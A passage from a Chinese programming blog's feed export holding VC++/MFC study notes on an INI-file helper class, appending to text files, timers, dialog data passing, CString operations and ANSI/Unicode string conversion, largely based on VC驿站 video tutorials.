LPCTSTR lpValue,bool bCreate=true); //设置键值，bCreate是指段名及键名未存在时，是否创建。 CString GetValue(LPCTSTR lpSection, LPCTSTR lpKey); //得到键值. BOOL DelSection(LPCTSTR strSection); //删除段名 BOOL DelKey(LPCTSTR lpSection, LPCTSTR lpKey); //删除键名public: //高级操作： int GetSections(CStringArray&amp; arrSection); //枚举出全部的段名 int GetKeyValues(CStringArray&amp; arrKey,CStringArray&amp; arrValue,LPCTSTR lpSection); //枚举出一段内的全部键名及值BOOL DelAllSections();};文件 2:#include &quot;StdAfx.h&quot; #include &quot;ini.h&quot;#define MAX_ALLSECTIONS 2048 //全部的段名 #define MAX_SECTION 260 //一个段名长度 #define MAX_ALLKEYS 6000 //全部的键名 #define MAX_KEY 260 //一个键名长度BOOL CIni::SetFileName(LPCTSTR lpFileName) { CFile file; CFileStatus status;if(!file.GetStatus(lpFileName,status)) return TRUE;m_strFileName=lpFileName; return FALSE; }CString CIni::GetFileName(void) { return m_strFileName; }BOOL CIni::SetValue(LPCTSTR lpSection, LPCTSTR lpKey, LPCTSTR lpValue,bool bCreate) { TCHAR lpTemp[MAX_PATH] ={0};//以下if语句表示如果设置bCreate为false时，当没有这个键名时则返回TRUE（表示出错） //!*&amp;*none-value*&amp;!* 这是个垃圾字符没有特别意义，这样乱写是防止凑巧相同。 if (!bCreate) { GetPrivateProfileString(lpSection,lpKey,&quot;!*&amp;*none-value*&amp;!*&quot;,lpTemp,MAX_PATH,m_strFileName); if(strcmp(lpTemp,&quot;!*&amp;*none-value*&amp;!*&quot;)==0) return TRUE; }if(WritePrivateProfileString(lpSection,lpKey,lpValue,m_strFileName)) return FALSE; else return GetLastError(); }CString CIni::GetValue(LPCTSTR lpSection, LPCTSTR lpKey) { DWORD dValue; TCHAR lpValue[MAX_PATH] ={0};dValue=GetPrivateProfileString(lpSection,lpKey,&quot;&quot;,lpValue,MAX_PATH,m_strFileName); return lpValue; }BOOL CIni::DelSection(LPCTSTR lpSection) { if(WritePrivateProfileString(lpSection,NULL,NULL,m_strFileName)) return FALSE; else return GetLastError(); }BOOL CIni::DelKey(LPCTSTR lpSection, LPCTSTR lpKey) { if(WritePrivateProfileString(lpSection,lpKey,NULL,m_strFileName)) return FALSE; else return GetLastError(); }int CIni::GetSections(CStringArray&amp; arrSection) { /* 本函数基础： GetPrivateProfileSectionNames - 从 ini 文件中获得 Section 的名称 如果 ini 中有两个 Section: [sec1] 和 [sec2]，则返回的是 &#39;sec1&#39;,0,&#39;sec2&#39;,0,0 ，当你不知道 ini 中有哪些 section 的时候可以用这个 api 来获取名称 */ int i; int iPos=0; int iMaxCount; TCHAR chSectionNames[MAX_ALLSECTIONS]={0}; //总的提出来的字符串 TCHAR chSection[MAX_SECTION]={0}; //存放一个段名。 GetPrivateProfileSectionNames(chSectionNames,MAX_ALLSECTIONS,m_strFileName);//以下循环，截断到两个连续的0 for(i=0;i&lt;MAX_ALLSECTIONS;i++) { if (chSectionNames[i]==0) if (chSectionNames[i]==chSectionNames[i+1]) break; }iMaxCount=i+1; //要多一个0号元素。即找出全部字符串的结束部分。 arrSection.RemoveAll();//清空原数组for(i=0;i&lt;iMaxCount;i++) { chSection[iPos++]=chSectionNames[i]; if(chSectionNames[i]==0) { arrSection.Add(chSection); memset(chSection,0,MAX_SECTION); iPos=0; }}return (int)arrSection.GetSize(); }int CIni::GetKeyValues(CStringArray&amp; arrKey,CStringArray&amp; arrValue, LPCTSTR lpSection) { /* 本函数基础： GetPrivateProfileSection- 从 ini 文件中获得一个Section的全部键名及值名 如果ini中有一个段，其下有 &quot;段1=值1&quot; &quot;段2=值2&quot;，则返回的是 &#39;段1=值1&#39;,0,&#39;段2=值2&#39;,0,0 ，当你不知道 获得一个段中的所有键及值可以用这个。 */ int i; int iPos=0; CString strKeyValue; int iMaxCount; TCHAR chKeyNames[MAX_ALLKEYS]={0}; //总的提出来的字符串 TCHAR chKey[MAX_KEY]={0}; //提出来的一个键名GetPrivateProfileSection(lpSection,chKeyNames,MAX_ALLKEYS,m_strFileName);for(i=0;i&lt;MAX_ALLKEYS;i++) { if (chKeyNames[i]==0) if (chKeyNames[i]==chKeyNames[i+1]) break; }iMaxCount=i+1; //要多一个0号元素。即找出全部字符串的结束部分。 arrKey.RemoveAll();//清空原数组 arrValue.RemoveAll();for(i=0;i&lt;iMaxCount;i++) { chKey[iPos++]=chKeyNames[i]; if(chKeyNames[i]==0) { strKeyValue=chKey; arrKey.Add(strKeyValue.Left(strKeyValue.Find(&quot;=&quot;))); arrValue.Add(strKeyValue.Mid(strKeyValue.Find(&quot;=&quot;)+1)); memset(chKey,0,MAX_KEY); iPos=0; }}return (int)arrKey.GetSize(); }BOOL CIni::DelAllSections() { int nSection; CStringArray arrSection; nSection=GetSections(arrSection); for(int i=0;i&lt;nSection;i++) { if(DelSection(arrSection[i])) return GetLastError(); } return FALSE; }使用方法： CIni ini(&quot;c:\\a.ini&quot;); int n;/*获得值 TRACE(&quot;%s&quot;,ini.GetValue(&quot;段1&quot;,&quot;键1&quot;)); *//*添加值 ini.SetValue(&quot;自定义段&quot;,&quot;键1&quot;,&quot;值&quot;); ini.SetValue(&quot;自定义段2&quot;,&quot;键1&quot;,&quot;值&quot;,false); *//*枚举全部段名 CStringArray arrSection; n=ini.GetSections(arrSection); for(int i=0;i&lt;n;i++) TRACE(&quot;%s\n&quot;,arrSection[i]); *//*枚举全部键名及值 CStringArray arrKey,arrValue; n=ini.GetKeyValues(arrKey,arrValue,&quot;段1&quot;); for(int i=0;i&lt;n;i++) TRACE(&quot;键：%s\n值：%s\n&quot;,arrKey[i],arrValue[i]); *//*删除键值 ini.DelKey(&quot;段1&quot;,&quot;键1&quot;); *//*删除段 ini.DelSection(&quot;段1&quot;); *//*删除全部 ini.DelAllSections(); */VC++中以追加方式向文本文件写入数据今天，我要用MFC中的CStdioFile类进行文件操作，读写等。可是，看了下好像没有简单的方法，于是在网上看到这样的写法：CStdioFile file(strFile,CFile::modeCreate|CFile::modeNoTruncate|CFile::modeWrite);file.WriteString(strTmp);file.Close;modeNoTruncate的意思就是不要截取的意思吧可是，试了下这段代码，并没有起作用，不知道是什么原因。于是，在WriteString写字符串之前加了个把指针先定位到文件末尾的代码，就可以了CString strTmp=&quot;hehe\r\n&quot;;CStdioFile file(strFile,CFile::modeCreate|CFile::modeNoTruncate|CFile::modeWrite);file.SeekToEnd();//先定位到文件尾部file.WriteString(strTmp);file.Close;</code></pre>]]></content>
      
      
      <categories>
          
          <category> c&amp;c++ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>定时器</title>
      <link href="/c-c/c&amp;c++/vc-timer/"/>
      <url>/c-c/c&amp;c++/vc-timer/</url>
      
        <content type="html"><![CDATA[<p>-————————————————————————-<br>VC 驿站<br>WwW.CcTry.CoM<br>多抽出一分钟时间来学习，让你的生命更加精彩！<br>C、C++、VC++ 各种学习资源，免费教程，期待您的加入！<br>动画教程只是起到技术交流的作用，请大家不用利用此方法做非法用途.<br>由此动画造成的任何后果和动画作者及本站无关.<br>-—————————————————————————————<br>大家好，我是Syc<br>今天给大家做的教程是：<br>vc++基础班[9]—定时器的使用<br>—————————————— Begin ———————————————-<br>定时器（Timer）在 Windows 的程序设计中很多地方都能用到，他的主要用途是按程序的设定间隔时间，间歇性的产生 WM_TIMER 消息，发送到指定窗口<br>之后，在窗口中对 WM_TIMER 消息进行处理，完成指定的任务！</p><p>①、定时器函数的讲解：<br>◆ 定时器启动函数：SetTimer<br>◆ 定时器响应函数：OnTimer<br>◆ 定时器结束函数：KillTimer</p><p>时间间隔范围：USER_TIMER_MINIMUM（最小值） 到 USER_TIMER_MAXIMUM（最大值）<br>#define USER_TIMER_MAXIMUM 0x7FFFFFFF 毫秒<br>#define USER_TIMER_MINIMUM 0x0000000A 毫秒</p><p>如果需要更精确的定时器，详见：<a href="http://www.cctry.com/thread-6536-1-1.html" target="_blank" rel="noopener">http://www.cctry.com/thread-6536-1-1.html</a></p><p>②、限制定时器的响应次数；</p><p>③、利用 CStatic 控件动态显示系统时间：<br>◆ CStatic 控件响应消息的准备：1&gt;ID不能是 IDC_STATIC；2&gt; 控件属性的 Notify 设置为 True；<br>◆ CTime 类的简单实用；<br>◆ 更改 CStatic 控件的文字颜色；<br>if (nCtlColor == CTLCOLOR_STATIC &amp;&amp; pWnd-&gt;GetDlgCtrlID() == IDC_SHOW){<br>pDC-&gt;SetTextColor(RGB(0, 0, 255));<br>pDC-&gt;SetBkMode(TRANSPARENT);<br>return CreateSolidBrush(GetSysColor(COLOR_3DFACE));<br>}</p><p>◆ 时间格式中有中文的情况如何处理；<br>#include &lt;locale.h&gt;<br>_tsetlocale(LC_ALL, _T(“chs”));<br>//本函数用来配置地域的信息，设置当前程序使用的本地化信息。<br>————————————- End ——————————————-</p>]]></content>
      
      
      <categories>
          
          <category> c&amp;c++ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>开源控件</title>
      <link href="/c-c/c&amp;c++/cctry-note8/"/>
      <url>/c-c/c&amp;c++/cctry-note8/</url>
      
        <content type="html"><![CDATA[<p>-————————————————————————–<br>VC 驿站<br>WwW.CcTry.CoM<br>多抽出一分钟时间来学习，让你的生命更加精彩！<br>C、C++、VC++ 各种学习资源，免费教程，期待您的加入！<br>动画教程只是起到技术交流的作用，请大家不用利用此方法做非法用途.<br>由此动画造成的任何后果和动画作者及本站无关.<br>-—————————————————————————————<br>大家好，我是Syc<br>今天给大家做的教程是：<br>vc++基础班[7]—开源控件类的使用<br>—————————————— Begin ———————————————-</p><h1 id="有问必答，帖子回复针对谁，这样可以马上收到信息！"><a href="#有问必答，帖子回复针对谁，这样可以马上收到信息！" class="headerlink" title="有问必答，帖子回复针对谁，这样可以马上收到信息！"></a>有问必答，帖子回复针对谁，这样可以马上收到信息！</h1><p>①、控件绑定变量的删除；</p><p>②、MFC 与 SDK API 中同名函数的问题：<br>◆ 回到作用域内；<br>◆ 获取窗口句柄；</p><p>③、各种开源控件类的使用；<br>实际就是绑定控件类型变量，进行子类化操作。<br>————————————- End ——————————————-</p>]]></content>
      
      
      <categories>
          
          <category> c&amp;c++ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>对话框之间的数据传递</title>
      <link href="/c-c/c&amp;c++/cctry-note-6/"/>
      <url>/c-c/c&amp;c++/cctry-note-6/</url>
      
        <content type="html"><![CDATA[<p>-————————————————————————–<br>VC 驿站<br>WwW.CcTry.CoM<br>多抽出一分钟时间来学习，让你的生命更加精彩！<br>C、C++、VC++ 各种学习资源，免费教程，期待您的加入！<br>动画教程只是起到技术交流的作用，请大家不用利用此方法做非法用途.<br>由此动画造成的任何后果和动画作者及本站无关.<br>-—————————————————————————————<br>大家好，我是Syc<br>今天给大家做的教程是：<br>vc++基础班[6]—对话框之间的数据传递<br>—————————————— Begin ———————————————-<br>以模态对话框为例给大家讲解，非模态的大家可以在课后自己练习，也算是给大家留的一个小作业吧！</p><p>①、全局变量法：<br>②、主对话框法：AfxGetMainWnd();<br>③、父窗口法：GetParent();<br>④、成员变量、成员函数法；<br>————————————- End ——————————————-</p>]]></content>
      
      
      <categories>
          
          <category> c&amp;c++ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>内存分配</title>
      <link href="/c-c/c&amp;c++/c++%20memory/"/>
      <url>/c-c/c&amp;c++/c++%20memory/</url>
      
        <content type="html"><![CDATA[<p>1\全局变量,在全局作用域的地方申明变量</p><p>2\使用new关键字的方式</p><p>3\使用allohoc</p>]]></content>
      
      
      <categories>
          
          <category> c&amp;c++ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>extern</title>
      <link href="/c-c/c&amp;c++/c++-extern/"/>
      <url>/c-c/c&amp;c++/c++-extern/</url>
      
        <content type="html"><![CDATA[<p>extern可以置于变量或者函数前，以标示变量或者函数的定义在别的文件中，提示编译器遇到此变量和函数时在其他模块中寻找其定义。此外extern也可用来进行链接指定。</p><p>用来作为全局变量,进行对话框之间数据通信</p>]]></content>
      
      
      <categories>
          
          <category> c&amp;c++ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>vc驿站视频教程笔记 对话框</title>
      <link href="/c-c/c&amp;c++/cctry-note-5/"/>
      <url>/c-c/c&amp;c++/cctry-note-5/</url>
      
        <content type="html"><![CDATA[<p>-————————————————————————–<br>VC 驿站<br>WwW.CcTry.CoM<br>多抽出一分钟时间来学习，让你的生命更加精彩！<br>C、C++、VC++ 各种学习资源，免费教程，期待您的加入！<br>动画教程只是起到技术交流的作用，请大家不用利用此方法做非法用途.<br>由此动画造成的任何后果和动画作者及本站无关.<br>-—————————————————————————————<br>大家好，我是Syc<br>今天给大家做的教程是：<br>vc++基础班[5]—模态与非模态对话框<br>—————————————— Begin ———————————————-<br>①、模态对话框与非模态对话框的区别：<br>具体见演示！</p><p>②、新对话框资源的添加及相关类的绑定：</p><p>③、模态对话框的创建：CDialog::DoModal<br>④、非模态对话框的创建：CDialog::Create<br>堆中申请内存：new、malloc<br>静态存储区域：全局变量<br>◆ 解决一闪而过的问题，为什么模态的不会发生这种情况呢？<br>◆ 解决重复创建的问题；</p><p>⑤、对话框的初始化工作：<br>◆ 在 OnInitDialog() 函数中进行，如果没有的话需自己进行添加；<br>◆ // TODO: Add extra initialization here 提示在哪加代码就在哪加，否则会出未知的问题的！</p><p>※※※ ⑥、两个对话框之间值的传递<br>◆ 此对象非彼对象；<br>◆ 设置新对话框的初始化值，从新对话框取值；</p><p>————————————- End ——————————————-<br>全局变量存储区：<a href="http://www.cctry.com/thread-18651-1-1.html" target="_blank" rel="noopener">http://www.cctry.com/thread-18651-1-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> c&amp;c++ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>vc驿站视频教程笔记4 Cstring 讲解</title>
      <link href="/c-c/c&amp;c++/cctry-note-4/"/>
      <url>/c-c/c&amp;c++/cctry-note-4/</url>
      
        <content type="html"><![CDATA[<p>-————————————————————————–<br>VC 驿站<br>WwW.CcTry.CoM<br>多抽出一分钟时间来学习，让你的生命更加精彩！<br>C、C++、VC++ 各种学习资源，免费教程，期待您的加入！<br>动画教程只是起到技术交流的作用，请大家不用利用此方法做非法用途.<br>由此动画造成的任何后果和动画作者及本站无关.<br>-—————————————————————————————<br>大家好，我是Syc<br>今天给大家做的教程是：<br>vc++基础班[4]—CString常用操作讲解<br>—————————————— Begin ———————————————-<br>①、CString 类对象的初始化：<br>CString str;<br>CString str1(_T(“abc”));<br>CString str2 = _T(“defg”);</p><p>TCHAR szBuf[] = _T(“kkk”);<br>CString str3(szBuf);<br>CString str4 = szBuf;</p><p>TCHAR <em>p = _T(“1k2”);<br>//TCHAR </em> 转换为 CString<br>CString str5(p);<br>CString str6 = p;</p><p>CString str7(str1);<br>CString str8 = str7;</p><p>②、字符串基本操作：<br>● 长度：GetLength();<br>CString str(_T(“abc”));<br>int len = str.GetLength(); //len == 3</p><p>● 是否为空，即不含字符：IsEmpty();<br>● 清空字符串：Empty();<br>CString str(_T(“abc”));<br>BOOL mEmpty = str.IsEmpty(); //mEmpty == FALSE<br>str.Empty();<br>mEmpty = str.IsEmpty(); //mEmpty == TRUE</p><p>● 转换大小写：MakeUpper、MakeLower<br>● 转换顺序：MakeReverse<br>CString str(_T(“Abc”));<br>str.MakeUpper(); //str == ABC<br>str.MakeLower(); //str == abc<br>str.MakeReverse(); //str == cba</p><p>● 字符串的连接：+、+=<br>CString str(_T(“abc”));<br>str = _T(“de”) + str + _T(“kp”); //str == deabckp<br>str += _T(“123”); //str == deabckp123<br>TCHAR szBuf[] = _T(“789”);<br>str += szBuf; //str == deabckp123789</p><p>● 字符串的比较：==、!=、(&lt;、&gt;、&lt;=、&gt;= 不常用)、Compare(区分大小写)、CompareNoCase(不区分大小写)<br>CString str1(_T(“abc”));<br>CString str2 = _T(“aBc”);<br>if (str1 == str2){<br>MessageBox(_T(“str1 等于 str2”));<br>}else{<br>MessageBox(_T(“str1 不等于 str2”));<br>}</p><p>③、字符串的查找：<br>Find、ReverseFind、FindOneOf 三个函数可以实现字符串的查找操作<br>Find 从指定位置开始查找指定的字符或者字符串，返回其位置，找不到返回 -1；<br>举例：<br>CString str(_T(“abcdefg”));<br>int idx = str.Find(_T(“cde”), 0); //idx 的值为2;</p><p>ReverseFind 从字符串末尾开始查找指定的字符，返回其位置，找不到返回 -1，虽然是从后向前查找，但是位置为从开始算起；<br>CString str(_T(“abcdefg”));<br>int idx = str.ReverseFind(‘e’); //idx 的值为4;</p><p>FindOneOf 查找参数中给定字符串中的任意字符，返回第一次出现的位置，找不到返回 -1；<br>CString str(_T(“abcabcd”));<br>int idx = str.FindOneOf(_T(“cbd”)); //idx 的值为1;</p><p>④、字符串的替换与删除：<br>Replace 替换 CString 对象中的指定的字符或者字符串，返回替换的个数，无匹配字符返回 0；<br>CString str(_T(“abcdabc”));<br>int num = str.Replace(‘b’, ‘k’); //str == akcdakc, num == 2</p><p>CString str(_T(“abcdabc”));<br>int num = str.Replace(_T(“bc”), _T(“kw”)); //str == akwdakw, num == 2</p><p>Remove 删除 CString 对象中的指定字符，返回删除字符的个数，有多个时都会删除；<br>CString str(_T(“abcdabcb”));<br>int num = str.Remove(‘b’); //str == acdac, num == 3</p><p>Delete 删除 CString 对象中的指定位置的字符，返回处理后的字符串长度；<br>CString str(_T(“abcd”));<br>int num = str.Delete(1, 3); //str == a, num == 1</p><p>⑤、字符串的提取：<br>Left、Mid、Right 三个函数分别实现从 CString 对象的 左、中、右 进行字符串的提取操作；<br>CString str(_T(“abcd”));<br>CString strResult = str.Left(2); //strResult == ab<br>strResult = str.Mid(1); //strResult == bcd<br>strResult = str.Mid(0, 2); //strResult == ab<br>strResult = str.Right(2); //strResult == cd</p><p>⑥、单个字符的修改：<br>GetAt、SetAt 可以获取与修改 CString 对象中的单个 TCHAR 类型字符；<br>[] 操作符也可以获取 CString 对象中的单个字符，但为只读的，不能进行修改；<br>CString str(_T(“abcd”));<br>str.SetAt(0, ‘k’); //str == kbck<br>TCHAR ch = str.GetAt(2); //ch == c</p><p>⑦、其他类型与 CString 对象类型的转换：<br>● 格式化字符串：Format 方法，实现从 int、long 等数值类型、TCHAR、TCHAR * 等类型向 CString 类型的转换；<br>int num = 6;<br>CString str;<br>str.Format(_T(“%d”), num);</p><p>● CString 类型向 int 等数值类型、TCHAR <em> 类型的转换：<br>TCHAR </em>pszBuf = str.GetBuffer();<br>str.ReleaseBuffer();</p><p>TCHAR *p = (LPTSTR)(LPCTSTR)str;</p><p>CString str1(_T(“123”));<br>int num = _ttoi(str1);</p><p>⑧、CString 对象的 Ansi 与 Unicode 转换：<br>大家可以直接使用上节课给大家讲解的方法，此外这里给大家介绍一种从 Ansi 转换到 Unicode 的隐含方法：<br>//当前工程环境为Unicode<br>CString str;<br>str = “abc”;<br>char *p = “defg”;<br>str = p;</p><p>⑨、※※※ CString 对象字符串所占用的字节数：<br>CString str = _T(“abc”);<br>错误的求法：sizeof(CString)、sizeof(str)<br>正确的求法：str.GetLength()*sizeof(TCHAR)</p><p>⑩、※※※ 当作为 TCHAR * 类型传参时，确保申请了足够用的空间，比如使用 GetModuleFileName 函数；</p><p>————————————- End ——————————————-</p>]]></content>
      
      
      <categories>
          
          <category> c&amp;c++ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>vc驿站视频教程笔记2 ansi 和 unicode</title>
      <link href="/c-c/c&amp;c++/cctry-note2/"/>
      <url>/c-c/c&amp;c++/cctry-note2/</url>
      
        <content type="html"><![CDATA[<p>-————————————————————————–<br>VC 驿站<br>WwW.CcTry.CoM<br>多抽出一分钟时间来学习，让你的生命更加精彩！<br>C、C++、VC++ 各种学习资源，免费教程，期待您的加入！<br>动画教程只是起到技术交流的作用，请大家不用利用此方法做非法用途.<br>由此动画造成的任何后果和动画作者及本站无关.<br>-—————————————————————————————<br>大家好，我是Syc<br>今天给大家做的教程是：<br>vc++基础班[2]—Ansi与Unicode<br>-—————————————————————————————<br>①、Ansi与Unicode简要说明及各自的优缺点：<br>他们是两种字符的编码格式，Ansi=窄字节，Unicode=宽字节，Ansi用char格式表示一个字符，占用一个字节的存储空间，最多表示255个字符，<br>表示英文还可以，但对于中文、日文、韩文等语言来说就不够用了，所以如果你的程序是Ansi编码的话，<br>那么你写的中文语言的程序拿到日文、韩文等系统上面就会出现乱码。所以有了Unicode，用二个字节去表示一个字符，格式是 unsigned short，被定义成 wchar_t 格式<br>这样就可以表示世界上绝大多数的语言了！但有利就有弊，缺点呢？就是空间占用翻倍了，网络传输的数据量也增大了……</p><p>◆ vc++ 6.0 默认为Ansi编码，vs2005、vs2008、vs2010 等默认都是Unicode编码，当然可以进行工程的设置从而进行编码的转换，见演示！</p><p>◆ 就我个人观点：还是建议大家使用Unicode宽字节的编码格式，具体见下面：</p><p>◆ 系统提供了两种类型的 API 函数，见：user32.dll 中的 MessageBox 函数，其实 MessageBox 他只是一个宏，他对应的两个版本的函数分别为：MessageBoxA 和 MessageBoxW，你在使用的时候系统会根据是否定义了_UNICODE 宏来进行判断该使用哪个版本的函数！如果你的工程没有定义_UNICODE 宏，那么就使用窄字节的 MessageBoxA，如果定义了，那么就使用宽字节的 MessageBoxW，具体在vs2008中，右键找定义，见演示！</p><p>◆ 网摘：Windows 2000 及其以后的 Xp、2003、Vista、Win7 等系统都是使用Unicode从头进行开发的，如果调用任何一个Windows API 函数并给它传递一个 ANSI 字符串，那么系统首先要将字符串转换成Unicode，然后将Unicode字符串传递给操作系统。如果希望函数返回ANSI字符串，系统就会先将Unicode字符串转换成ANSI字符串，然后将结果返回给你的应用程序。进行这些字符串的转换需要占用系统的时间和内存。通过从头开始用Unicode来开发应用程序，就能够使你的应用程序更加高效的运行！</p><p>==================================================================</p><p>②、不同编码格式下的字符串处理及相互转化：</p><p>◆ 大家在编程时经常遇到的数据类型：<br>● Ansi：<br>char、char <em> 、const char </em><br>CHAR、(PCHAR、PSTR、LPSTR)、LPCSTR</p><p>● Unicode：<br>wchar_t、wchar_t <em> 、const wchar_t </em><br>WCHAR、(PWCHAR、PWSTR、LPWSTR)、LPCWSTR</p><p>● T 通用类型：<br>TCHAR、(TCHAR * 、PTCHAR、PTSTR、LPTSTR)、LPCTSTR</p><p>以上，其中：P代表指针的意思，STR代表字符串的意思，L是长指针的意思，在WIN32平台下可以忽略，C代表const常量的意思，W代表wide宽字节的意思，T大家可以理解为通用类型的意思，<br>就是可以根据工程中是否定义_UNICODE 宏，分别定义成不同的类型，比如：TCHAR 类型，如果工程中定义了_UNICODE 宏，那么他最终被定义成 wchar_t 类型，<br>如果工程中没有定义_UNICODE 宏，那么 TCHAR 被最终定义成 char 类型。</p><p>〓※※※〓 其方便性就是修改了工程的编码格式之后不用修改代码，所以还是建议大家在编写程序的时候使用通用类型！</p><p>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</p><p>◆ 字符串类型的对象的定义：<br>● Ansi：char <em>pAnsiStr = “hello”;<br>● Unicode：wchar_t </em>pUnicodeStr = L”hello”;<br>● 通用类型：TCHAR <em>pTStr = _T(“hello”); 或者 TCHAR </em>pTStr = _TEXT(“hello”);<br>● 动态申请内存：TCHAR *pszBuf = new TCHAR[100];</p><p>其中，_TEXT 和 _T 是一样的，定义如下：<br>#define _T(x) <strong>T(x)<br>#define _TEXT(x) </strong>T(x)</p><p>来看看 <strong>T 的最终定义：<br>#ifdef _UNICODE<br>#define </strong>T(x) L##x<br>#else<br>#define __T(x) x<br>#endif</p><p>其中，##为连接起来的意思。</p><p>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</p><p>◆ 常用的字符串处理函数，具体信息见MSDN：<br>字符串长度：<br>● Ansi：strlen(char <em>str);<br>● Unicode：wcslen(wchar_t </em>str);<br>● 通用函数：_tcslen(TCHAR *str);</p><p>● Ansi：int atoi(const char <em>str);<br>● Unicode：int _wtoi(const wchar_t </em>str);<br>● 通用函数：_tstoi(const TCHAR *str);</p><p>字符串拷贝：<br>● Ansi：strcpy(char <em>strDestination, const char </em>strSource);<br>● Unicode：wcscpy(wchar_t <em>strDestination, const wchar_t </em>strSource);<br>● 通用函数：_tcscpy(TCHAR <em>strDestination, const TCHAR </em>strSource);</p><p>以上函数不安全，在vs2003等以上版本的编译器中会有warnning警告提示，以下为安全函数（vc++6.0不支持）：<br>● Ansi：strcpy_s(char <em>strDestination, size_t numberOfElements, const char </em>strSource);<br>● Unicode：wcscpy_s(wchar_t <em>strDestination, size_t numberOfElements, const wchar_t </em>strSource);<br>● 通用函数：_tcscpy_s(TCHAR <em>strDestination, size_t numberOfElements, const TCHAR </em>strSource);</p><p>numberOfElements<br>Size of the destination string buffer. 目的缓冲区的大小，以字节为单位，不是字符！</p><p>size_t unsigned integer，在MSDN中的解释：Result of sizeof operator，也就是说 size_t 是 unsigned integer 即无符号整数。那为什么会有size_t这个类型呢？<br>因为不同平台的操作系统(32/64)中 int/long 等类型所占的字节并不一样，而 size_t 在不同的平台下有不同的定义。有点类似于TCHAR类型：<br>#ifndef _SIZE_T_DEFINED<br>#ifdef _WIN64<br>typedef unsigned __int64 size_t; //8个字节，64位<br>#else<br>typedef _W64 unsigned int size_t; //4个字节，32位<br>#endif<br>#define _SIZE_T_DEFINED<br>#endif</p><p>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</p><p>◆ Ansi 与 Unicode 字符串类型的互相转换：<br>上面给大家介绍的都是窄字节就是窄字节，宽字节就是宽字节，那么下面就给大家介绍下他们两个之间的转换。<br>在程序中还是不建议大家来回来去的进行字符串编码之间的转换，要么就都使用Ansi，要么就都使用Unicode，<br>但是往往有些函数只提供了窄字节版本（比如：GetProcAddress）或者只提供宽字节版本（比如：CommandLineToArgvW），<br>这个时候就要进行字符串编码格式的转换了。</p><p>但是，不是所有的都需要转换，有一些是不需要转换的，比如 socket 中的 send 或者 recv 函数！</p><p>● 转换用到的最根本的 API 函数：<br>WideCharToMultiByte 实现宽字节转换到窄字节<br>MultiByteToWideChar 实现窄字节转换到宽字节</p><p>WideCharToMultiByte 的代码页用来标记与新转换的字符串相关的代码页；<br>MultiByteToWideChar 的代码页用来标记与一个多字节字符串相关的代码页，</p><p>[1]、常用的代码页有 CP_ACP 和 CP_UTF8 两个：<br>使用 CP_ACP 代码页就实现了 ANSI 与 Unicode 之间的转换；— 我们所用的！<br>使用 CP_UTF8 代码页就实现了 UTF-8 与 Unicode 之间的转换。</p><p>[2]、dwFlags 参数允许我们进行额外的控制，但是，一般情况下都不使用这个标志，直接传递 0 就行了。</p><p>[3]、lpDefaultChar和pfUsedDefaultChar：只有当WideCharToMultiByte函数遇到一个宽字节字符，而该字符在uCodePage参数标识的代码页中并没有它的表示法时，WideCharToMultiByte函数才使用这两个参数。如果宽字节字符不能被转换，该函数便使用lpDefaultChar参数指向的字符。如果该参数是NULL（这是大多数情况下的参数值），那么该函数使用系统的默认字符。该默认字符通常是个问号。这对于文件名来说是危险的，因为问号是个通配符。pfUsedDefaultChar参数指向一个布尔变量，如果Unicode字符串中至少有一个字符不能转换成等价多字节字符，那么函数就将该变量置为TRUE。如果所有字符均被成功地转换，那么该函数就将该变量置为FALSE。当函数返回以便检查宽字节字符串是否被成功地转换后，可以测试该变量。</p><p>● 两个转换函数的使用：<br>● A2W、W2A、T2A、T2W 宏的使用：</p><p>③、CString常用操作讲解</p><p>————————————- End ——————————————-</p>]]></content>
      
      
      <categories>
          
          <category> c&amp;c++ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>vc驿站视频教程笔记 vc++编程环境的介绍</title>
      <link href="/c-c/c&amp;c++/cctry-note1/"/>
      <url>/c-c/c&amp;c++/cctry-note1/</url>
      
        <content type="html"><![CDATA[<p>VC 驿站<br>WwW.CcTry.CoM<br>多抽出一分钟时间来学习，让你的生命更加精彩！<br>C、C++、VC++ 各种学习资源，免费教程，期待您的加入！<br>动画教程只是起到技术交流的作用，请大家不用利用此方法做非法用途.<br>由此动画造成的任何后果和动画作者及本站无关.<br>-—————————————————————————————<br>大家好，我是Syc<br>今天给大家做的教程是：<br>vc++基础班[1]—vc++编程环境的介绍<br>-—————————————————————————————<br>①、编程环境：<br>操作系统：Windows XP Professional Sp3<br>编译器：<br>Visual Studio 2008 Professional + Sp1 + Visual Assist X<br>下载地址：<a href="http://www.cctry.com/thread-1-1-1.html" target="_blank" rel="noopener">http://www.cctry.com/thread-1-1-1.html</a></p><p>Visual Studio 6.0 - Visual C++ 6.0<br>Visual Studio 2002 - Visual C++ 7.0<br>Visual Studio 2003 - Visual C++ 7.1<br>Visual Studio 2005 - Visual C++ 8.0<br>Visual Studio 2008 - Visual C++ 9.0<br>Visual Studio 2010 - Visual C++ 10.0</p><p>②、学习过程中可以看的书籍，个人认为不错的，里面说到了我的不同时期看的不同书籍，希望对大家有帮助：<br>我的程序员学习路程【一】：<a href="http://www.cctry.com/thread-1101-1-1.html" target="_blank" rel="noopener">http://www.cctry.com/thread-1101-1-1.html</a><br>我的程序员学习路程【二】：<a href="http://www.cctry.com/thread-1143-1-1.html" target="_blank" rel="noopener">http://www.cctry.com/thread-1143-1-1.html</a><br>我的程序员学习路程【三】：<a href="http://www.cctry.com/thread-1225-1-1.html" target="_blank" rel="noopener">http://www.cctry.com/thread-1225-1-1.html</a><br>我的程序员学习路程【四】：<a href="http://www.cctry.com/thread-1707-1-1.html" target="_blank" rel="noopener">http://www.cctry.com/thread-1707-1-1.html</a></p><p>③、名词解释：<br>C语言、C++、JAVA 等等，都是编程语言，而 Visual C++（简称VC++或者VC）、VB、Delphi 等等都是编程工具，是一个软件而已！<br>API - Application Programming Interface 